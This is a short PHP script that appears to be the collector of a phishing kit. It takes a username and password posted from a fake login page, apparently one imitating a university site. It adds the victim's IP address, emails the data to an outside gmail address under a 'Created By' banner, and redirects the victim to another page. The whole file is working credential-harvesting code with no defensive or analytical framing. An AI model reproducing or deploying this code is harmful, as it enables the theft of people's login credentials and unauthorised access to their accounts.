<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ zultz +--------------\n";
$message .= "Username: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Sayee-Mayee|0147-----------------\n";
$send = "sayeemayee80000@gmail.com";
$subject = "smbceduau-web-web-$ip";
$headers = "From: Sayee<logs@rice.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: smbceduau.html");
?>